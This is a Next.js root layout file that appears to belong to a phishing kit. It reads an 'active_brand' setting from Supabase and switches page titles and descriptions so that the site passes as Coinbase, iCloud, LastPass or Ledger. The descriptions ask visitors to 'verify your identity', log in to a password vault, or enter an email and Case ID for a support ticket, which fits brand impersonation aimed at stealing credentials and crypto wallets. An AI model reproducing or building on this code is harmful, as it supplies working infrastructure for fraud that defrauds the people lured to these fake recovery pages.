import React from "react"
import type { Metadata, Viewport } from 'next'
import { Geist, Geist_Mono } from 'next/font/google'
import { createClient } from '@/lib/supabase/server'
import { getBrandConfig } from '@/lib/brands'
import './globals.css'

const _geist = Geist({ subsets: ["latin"] });
const _geistMono = Geist_Mono({ subsets: ["latin"] });

export const dynamic = "force-dynamic"

export const viewport: Viewport = {
  width: 'device-width',
  initialScale: 1,
  maximumScale: 1,
  userScalable: false,
  themeColor: '#0e0f11',
}

export async function generateMetadata(): Promise<Metadata> {
  let brandId = "coinbase"
  try {
    const supabase = await createClient()
    const { data } = await supabase
      .from("settings")
      .select("value")
      .eq("key", "active_brand")
      .single()
    if (data?.value) brandId = data.value
  } catch {
    // fallback
  }
  const brand = getBrandConfig(brandId)

  const desc = brandId === "icloud"
    ? `Recover your Apple Account. Verify your identity to restore access to your Apple Account and iCloud services.`
    : brandId === "lastpass"
    ? `Log in to your LastPass account to access your password vault and secure your digital life.`
    : brandId === "ledger"
    ? `Ledger Support - Verify your identity to continue with your open support ticket. Enter your email and Case ID.`
    : `${brand.name} account recovery. Verify your identity to restore access to your ${brand.name} account and secure your digital assets.`

  return {
    title: brand.title,
    description: desc,
    icons: {
      icon: '/api/favicon',
    },
    openGraph: {
      title: brand.title,
      description: desc,
      siteName: brand.name,
      type: 'website',
    },
    twitter: {
      card: 'summary',
      title: brand.title,
      description: desc,
    },
    other: {
      'Cache-Control': 'no-cache, no-store, must-revalidate',
    },
  }
}

export default function RootLayout({
  children,
}: Readonly<{
  children: React.ReactNode
}>) {
  return (
    <html lang="en">
      <body className={`font-sans antialiased`}>
        {children}
      </body>
    </html>
  )
}
